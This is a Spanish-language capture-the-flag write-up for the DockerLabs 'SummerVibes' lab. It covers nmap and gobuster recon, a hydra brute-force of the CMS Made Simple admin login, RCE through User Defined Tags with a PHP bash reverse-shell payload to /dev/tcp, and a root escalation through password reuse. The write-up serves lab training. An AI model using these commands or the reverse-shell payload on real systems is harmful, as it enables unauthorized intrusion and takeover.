# Máquina SummerVibes

Dificultad -> Difícil

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada a los puertos descubiertos en el anterior escaneo.

```shell
nmap -sCV -p22,80 172.17.0.2 -oN targeted
________________________________________________
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 d119f1fa4816af8a4a892d7889e92d94 (ECDSA)
|_  256 b8b72e643eeec32e2ebe99074e024f16 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Echamos un vistazo a la web que corre por el puerto 80. Se trata de la web por defecto de apache. 
Revisando el código fuente encontramos un comentario que nos da una pista:

![Pasted image 20240428141237](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/09748c7a-d163-47c6-b417-a9d54638bb5b)

Si accedemos a ese directorio encontramos un gestor de contenido:

![Pasted image 20240428141316](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/2ca7cda8-8221-47da-ade7-28012a94b951)

Aplicamos **fuzzing** sobre la web con **gobuster**:

```shell
gobuster dir -u http://172.17.0.2/cmsms/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,txt,html,php.bak
-------------------------------------------------------------------------------------------------------------------------
/index.php            (Status: 200) [Size: 19671]
/modules              (Status: 301) [Size: 316] [--> http://172.17.0.2/cmsms/modules/]
/uploads              (Status: 301) [Size: 316] [--> http://172.17.0.2/cmsms/uploads/]
/doc                  (Status: 301) [Size: 312] [--> http://172.17.0.2/cmsms/doc/]    
/admin                (Status: 301) [Size: 314] [--> http://172.17.0.2/cmsms/admin/]  
/assets               (Status: 301) [Size: 315] [--> http://172.17.0.2/cmsms/assets/] 
/lib                  (Status: 301) [Size: 312] [--> http://172.17.0.2/cmsms/lib/]    
/config.php           (Status: 200) [Size: 0]                                         
/tmp                  (Status: 301) [Size: 312] [--> http://172.17.0.2/cmsms/tmp/]  
```

Encontramos directorios interesantes como **/admin**, **/uploads**, etc.
Dentro del directorio **/admin** encontramos un panel de **login**:

![Pasted image 20240428145810](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/9685e43c-aa7b-4ad5-ae06-4f8aa537c03b)

Usando **whatweb** sobre la web principal, encontramos la versión del gestor de contenido -> **CMS-Made-Simple[2.2.19]**


--------------
## Explotación


Haciendo un poco de búsqueda, vemos que hay algunas vulnerabilidades para esta versión, pero que sucede con usuarios autenticados con privilegios administrativos.

[CVE-Details](https://www.cvedetails.com/cve/CVE-2024-27622/)
![Pasted image 20240428142536](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/f1b6cad1-1b48-4abb-b45d-dfc9bdddfa32)


[Github CVE Reference](https://github.com/capture0x/CMSMadeSimple)
![Pasted image 20240428142725](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/9dec9e60-3dfa-436d-bb52-be7a7bb85ba3)

Aplicaremos fuerza bruta sobre el panel de login con **hydra**:
Para ello, analizamos la **data** que se tramita al intentar hacer login en el panel de admin que encontramos anteriormente y la usamos en hydra:

![Pasted image 20240428150255](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/cc0840e2-037c-483c-8440-91daa97ed33d)

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt "http-post-form://172.17.0.2/cmsms/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect" 
-------------------------------------------------------------------------------------------------------------------------------------------------------------------
[80][http-post-form] host: 172.17.0.2   login: admin   password: chocolate
```

Encontramos las credeciales de admin -> **admin:chocolate**
Nos logeamos.

Es el momento de volver al exploit que encontramos antes -> [Github CVE Reference](https://github.com/capture0x/CMSMadeSimple)
Seguimos los pasos.
 
 - Extensions -> User Defined Tags

![Pasted image 20240428152312](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/263f11fe-f143-41f7-ad30-58ce125c1e00)

- Add User Defined Tag -> Introducimos el Payload -> Run

![Pasted image 20240428152534](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/1520cbfc-c2dd-42e7-8a7c-25da705225b6)

Tenemos **RCE** (Remote Comand Execution)

Nos ponemos en escucha con **netcat** para ganar acceso al sistema y nos enviamos una **reverse shell**:

Máquina atacante:

```shell
sudo nc -nlvp 443
```

Payload:

```php
<?php echo system('bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1" '); ?>
```

Run.

Estamos dentro !

------------------------------

Aplicamos el tratamiento de la **tty** para operar de forma cómoda.

------------
## Escalada de privilegios

```shell
ps -faux
```
![Pasted image 20240428153452](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/dcb57cae-722c-4dad-a737-1e5f44408c11)

Vemos que está corriendo una base de datos de forma interna.
Listaremos por archivos **config** para tratar de encontrar las credenciales:

```shell
find -name \*config\* 2>/dev/null
```

Abrimos el archivo -> **/var/www/html/cmsms/config.php**

```shell
cat /var/www/html/cmsms/config.php
----------------------------------------
$config['dbms'] = 'mysqli';
$config['db_hostname'] = 'localhost';
$config['db_username'] = 'cms';
$config['db_password'] = 'cms';
$config['db_name'] = 'test';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'UTC';
```

Usaremos las credenciales -> **cms:cms** para conectarnos a la base de datos.

```shell
mysql -H localhost -u cms -p
---------------------------------
ERROR 1044 (42000): Access denied for user 'cms'@'localhost' to database '172.17.0.2'
```

No nos permite conectarnos. Tras más reconocimiento del sistema, finalmente, la contraseña **chocolate** había sido reutilizada para el usuario **root**.

```shell
su root
whoami
----------------
root
```

Hemos alcanzado el nivel de privilegios máximos en el sistema.
